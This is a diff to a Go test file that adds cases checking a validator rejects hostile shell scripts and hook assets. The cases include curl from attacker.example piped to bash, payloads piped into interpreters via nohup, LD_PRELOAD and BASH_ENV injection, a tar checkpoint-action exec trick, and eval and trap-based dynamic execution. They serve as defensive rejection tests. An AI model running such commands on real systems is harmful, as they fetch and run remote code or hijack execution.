@@ -291,6 +291,7 @@ func TestValidateScriptAssetRejectsInterpreterPipelines(t *testing.T) {
 		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /bin/bash\n",
 		"#!/bin/bash\n/usr/bin/printf payload | command /usr/bin/env SAFE=1 python3\n",
 		"#!/bin/bash\n/usr/bin/printf payload | { /usr/bin/node; }\n",
+		"#!/bin/bash\n/usr/bin/printf payload | /usr/bin/nohup /bin/bash\n",
 		"#!/bin/bash\n/usr/bin/printf payload | exec -a hook-shell /bin/bash\n",
 		"#!/bin/bash\n/usr/bin/printf payload |& /bin/sh\n",
 	} {
@@ -354,6 +355,7 @@ func TestTrustedHookAssetsRejectExecutionInfluencingEnvironment(t *testing.T) {
 		"#!/bin/sh\ncommand env -u HOME command env LD_PRELOAD=./helper.so /bin/true\n",
 		"#!/bin/sh\nbuiltin export LD_AUDIT=./audit.so\n",
 		"#!/bin/sh\nexec /usr/bin/env BASH_ENV=./startup /bin/bash\n",
+		"#!/bin/sh\n/usr/bin/nohup /usr/bin/env LD_PRELOAD=./helper.so /bin/true\n",
 		"#!/bin/sh\nPYTHONPATH=./lib python3 helper.py\n",
 		"#!/bin/sh\nTAR_OPTIONS='--checkpoint-action=exec=x=$(printf \".%shelper\" /);$x' /usr/bin/tar -cf /dev/null /usr/bin/true\n",
 		"#!/bin/bash\nfor PATH in .; do helper; done\n",
@@ -398,6 +400,7 @@ func TestTrustedHookAssetsRejectDynamicCommandResolution(t *testing.T) {
 		"#!/bin/bash\ncommand -- builtin eval \"$(<helper)\"\n",
 		"#!/bin/bash\nexec /usr/bin/env -i builtin eval \"$(<helper)\"\n",
 		"#!/bin/bash\nnohup builtin eval \"$(<helper)\"\n",
+		"#!/bin/bash\n/usr/bin/nohup /bin/bash helper\n",
 		"#!/bin/bash\ntrap 'source helper' DEBUG; /bin/true\n",
 		"#!/bin/bash\ncommand builtin trap 'source helper' DEBUG; /bin/true\n",
 		"#!/bin/bash\nshopt -s expand_aliases\nalias run=\"$(printf '.%shelper' /)\"\nrun\n",
